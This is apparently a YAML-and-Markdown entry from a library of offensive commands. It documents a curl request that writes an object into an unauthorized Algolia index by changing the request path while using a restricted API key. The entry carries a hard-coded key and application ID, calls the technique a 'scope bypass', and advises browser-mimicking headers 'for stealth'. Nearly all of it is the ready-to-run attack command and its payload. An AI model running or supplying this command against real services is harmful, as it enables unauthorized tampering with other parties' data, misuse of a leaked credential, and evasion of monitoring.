---
data: >-
  curl
  "https://c1-in-2.algolianet.com/1/indexes/algolia/batch?x-algolia-api-key=0580d14b1c12e191b078f193b5e0e3ce&x-algolia-application-id=FTCHS7XZX2&x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.7.5"
  -H "Origin: https://www.algolia.com" -H "Accept-Encoding: gzip, deflate" -H
  "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1)
  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" -H
  "content-type: application/x-www-form-urlencoded" -H "accept:
  application/json" -H "Referer: https://www.algolia.com/explorer" -H
  "Connection: keep-alive" --data
  "{\"requests\":[{\"action\":\"addObject\",\"body\":{\"firstname\":\"Jimmie\",\"lastname\":\"Barninger\",\"zip_code\":12345}}]}"
  --compressed
tags:
  - algolia
  - api
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.429Z'
id: b5b2c107-4eaf-4ede-9622-8625a42dd9f7
verified: false
validated: true
submitted: true
---
# curl-add-object-to-unauthorized-index

## Command

```bash
curl "https://c1-in-2.algolianet.com/1/indexes/algolia/batch?x-algolia-api-key=0580d14b1c12e191b078f193b5e0e3ce&x-algolia-application-id=FTCHS7XZX2&x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.7.5" -H "Origin: https://www.algolia.com" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" -H "content-type: application/x-www-form-urlencoded" -H "accept: application/json" -H "Referer: https://www.algolia.com/explorer" -H "Connection: keep-alive" --data "{\"requests\":[{\"action\":\"addObject\",\"body\":{\"firstname\":\"Jimmie\",\"lastname\":\"Barninger\",\"zip_code\":12345}}]}" --compressed
```

## Description

Performs an addObject operation on an unauthorized index (e.g., 'algolia') using a restricted key by modifying the request path, exploiting scope bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL path `/indexes/{index}/batch` | Target index name (change to unauthorized) | Yes |
| `?x-algolia-api-key=KEY` | Restricted API key in query | Yes |
| `--data "JSON"` | Escaped JSON payload for addObject | Yes |
| Various `-H` headers | Mimic browser request for compatibility | No |

## Examples

### Basic Usage

```bash
curl "https://c1-in-2.algolianet.com/1/indexes/sdfdsf/batch?x-algolia-api-key=KEY" --data "{\"requests\":[{\"action\":\"addObject\",\"body\":{\"test\":\"data\"}}]}" -H "Content-Type: application/json"
```

### Advanced Usage

Include full headers to simulate browser explorer requests for stealth.

## Expected Output

{"taskID": 1234567890} if bypass succeeds, allowing addition to unauthorized index.

## Related

- [[commands/curl-add-object-to-test-index]]
